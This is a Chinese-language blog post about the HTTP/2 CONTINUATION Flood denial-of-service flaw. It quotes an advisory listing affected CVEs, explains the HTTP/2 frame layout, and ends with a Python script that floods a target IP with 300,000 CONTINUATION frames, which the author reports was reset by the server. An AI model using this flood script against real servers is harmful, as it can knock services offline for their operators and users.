---
categories:
- 信息技术
- 安全
cover: ''
date: 2024-04-09T13:45:24+08:00
draft: false
slug: 网络安全：http-2-continuation-flood漏洞
tags:
- CONTINUATION
- http2
- python
- 漏洞
- 网络安全
title: 网络安全：HTTP/2 CONTINUATION Flood漏洞
updated: 2024-04-09T14:05:49+08:00
wp_id: 8588
---

今天刷到一篇文章，HTTP / 2 协议被曝安全漏洞，被黑客利用可发起拒绝服务攻击。

心想，这服务器跑的不就是h2吗，该不会也被波及了吧。

抓紧看了一下原文

## 原文

### 漏洞描述

HTTP/2协议被披露存在拒绝服务漏洞，该漏洞被称为“HTTP/2 CONTINUATION Flood”，可导致拒绝服务（DoS）攻击，在某些实现中可通过单个TCP连接使web服务器崩溃，目前该漏洞的技术细节已公开披露。

由于某些HTTP/2协议实现中没有适当限制或清理单个数据流中发送的 CONTINUATION 帧的数量，攻击者可通过不设置 END\_HEADERS 标志位，向目标服务器发送 CONTINUATION 帧流，从而可能导致内存不足崩溃或CPU资源耗尽而导致服务器中断，造成拒绝服务。

### 影响范围

已知HTTP/2 CONTINUATION Flood影响多个项目，不同的HTTP/2实现可能会有特定于该实现的独特漏洞及影响，不同HTTP/2实现相对应的部分CVE ID如下：

lEnvoy（CVE-2024-27919、CVE-2024-30255）

lTempesta FW ( CVE-2024-2758 )

lamphp/http ( CVE-2024-2653 )

lGolang（CVE-2023-45288）

lnghttp2（CVE-2024-28182）

lApache HTTP Server ( CVE-2024-27316 )

lApache Traffic Server ( CVE-2024-31309 )

lNode.js（CVE-2024-27983）

值得注意的是，在某些受影响实现中，仅通过单个TCP连接就可能导致web服务器崩溃，且恶意请求可能在HTTP访问日志中不可见，这可能使得检测和分析更加困难。

---

呦吼，访问日志中不可见，这么牛逼， 那些老板都不用花钱买肉鸡DDoS了，直接连个商场WIFI加一台电脑搞定。

正所谓了解敌人才能更好保护自己，抓紧研究了一下这是什么原理。

## HTTP/2 原理

首先要了解HTTP/2 的实现原理，

|  |
| --- |
| HTTP2.0 |
| Length |
| Type | Flags |
| R | Stream Identifier |
| Frame Payload |

**Headers Frame: 帧头**  
固定的9个字节（(24+8+8+1+31)/8=9）呈现，变化的为帧的负载(Frame Payload)，负载内容是由帧类型（Type）定义。

**Length: 帧长度**

无符号的自然数，24个比特表示，仅表示帧负载（Frame Payload）所占用字节数，不包括帧头所占用的9个字节。 默认大小区间为为0~16,384(2^14)，一旦超过默认最大值2^14(16384)，发送方将不再允许发送，除非接收到接收方定义的SETTINGS\_MAX\_FRAME\_SIZE（一般此值区间为2^14 ~ 2^24）值的通知。

**Type帧类型**

8个比特表示，定义了帧负载的具体格式和帧的语义，HTTP/2规范定义了10个帧类型，这里不包括实验类型帧和扩展类型帧

| Frame Type | Code |
| --- | --- |
| DATA | 0x0 |
| HEADERS | 0x1 |
| PRIORITY | 0x2 |
| RST\_STREAM | 0x3 |
| SETTINGS | 0x4 |
| PUSH\_PROMISE | 0x5 |
| PING | 0x6 |
| GOAWAY | 0x7 |
| WINDOW\_UPDATE | 0x8 |
| CONTINUATION | 0x9 |

**Flags:帧的标志位**

8个比特表示，服务于具体帧类型，默认值为0x0。 8个比特可以容纳8个不同的标志，比如，PADDED值为0x8，二进制表示为00001000；END\_HEADERS值为0x4，二进制表示为00000100；END\_STREAM值为0X1，二进制为00000001。可以同时在一个字节中传达三种标志位，二进制表示为00001101，即0x13。因此，后面的帧结构中，标志位一般会使用8个比特表示，若某位不确定，使用问号?替代，表示此处可能会被设置标志位

**R:帧保留比特位**

HTTP/2语境下为保留的比特位，固定值为0X0。

**Stream Identifier：流标识符**

无符号的31比特表示无符号自然数。0x0值表示为帧仅作用于连接，不隶属于单独的流。

关于帧长度，需要稍加关注： - 0 ~ 2^14（16384）为默认约定长度，所有端点都需要遵守 - 2^14 (16,384) ~ 2^24-1(16,777,215)此区间数值，需要接收方设置SETTINGS\_MAX\_FRAME\_SIZE参数单独赋值 - 一端接收到的帧长度超过设定上限或帧太小，需要发送FRAME\_SIZE\_ERR错误 - 当帧长错误会影响到整个连接状态时，须以连接错误对待之；比如HEADERS，PUSH\_PROMISE，CONTINUATION，SETTINGS，以及帧标识符不该为0的帧等，都需要如此处理 - 任一端都没有义务必须使用完一个帧的所有可用空间 - 大帧可能会导致延迟，针对时间敏感的帧，比如RST\_STREAM, WINDOW\_UPDATE, PRIORITY，需要快速发送出去，以免延迟导致性能等问题

### HTTP2的 CONTINUATION 帧

HTTP2的 CONTINUATION 帧的格式如下：

![](./CONTINUATION.avif)

字段列表：

* Header Block Fragment，用于协助HEADERS/PUSH\_PROMISE等单帧无法包含完整的报头剩余部分数据。

注意事项：

* 一个HEADERS/PUSH\_PROMISE帧后面会跟随零个或多个CONTINUATION，只要上一个帧没有设置END\_HEADERS标志位，就不算一个帧完整数据的结束。
* 接收端处理此种情况，从开始的HEADERS/PUSH\_PROMISE帧到最后一个包含有END\_HEADERS标志位帧结束，合并的数据才算是一份完整数据拷贝
* 在HEADERS/PUSH\_PROMISE（没有END\_HEADERS标志位）和CONTINUATION帧中间，是不能够掺杂其它帧的，否则需要报PROTOCOL\_ERROR错误

标志位： \* END\_HEADERS(0X4)：表示报头块的最后一个帧，否则后面还会跟随CONTINUATION帧。

---

## 准备

目标明确，我们只需要手动发送HTTP2的 CONTINUATION 帧就行了。

打开python

```
import socket

# 目标IP地址和端口
target_ip = "1.1.1.1"
target_port = 80

# 创建一个socket连接
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, target_port))

# HTTP/2的magic字符串，用于协议升级
http2_magic = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'

# 发送magic字符串
sock.send(http2_magic)

# 构建HTTP/2 CONTINUATION帧的头部
# 帧长度(3字节), 类型(1字节, 0x9表示CONTINUATION), 标志(1字节), 流标识符(4字节)
frame_header = b'\x00\x00\x00' + b'\x09' + b'\x00' + b'\x00\x00\x00\x01'

# 构建一个空的CONTINUATION帧的有效载荷
frame_payload = b''

# 发送多个CONTINUATION帧
for i in range(300000): 
    print(i)
    # 最后一个帧设置END_HEADERS标志
    # if i == 299999:
    #     frame_header = frame_header[:4] + b'\x04' + frame_header[5:]
    # 发送帧
    sock.send(frame_header + frame_payload)

# 关闭socket连接
sock.close()
```

把 target\_ip 改成想要测试的ip

运行

然后

```
Traceback (most recent call last):
  File "e:\project\python\http.py", line 31, in <module>
    sock.send(frame_header + frame_payload)
ConnectionResetError: [WinError 10054] 远程主机强迫关闭了一个现有的连接。
```

整活失败，测试结束！

![](./小本本-1.webp)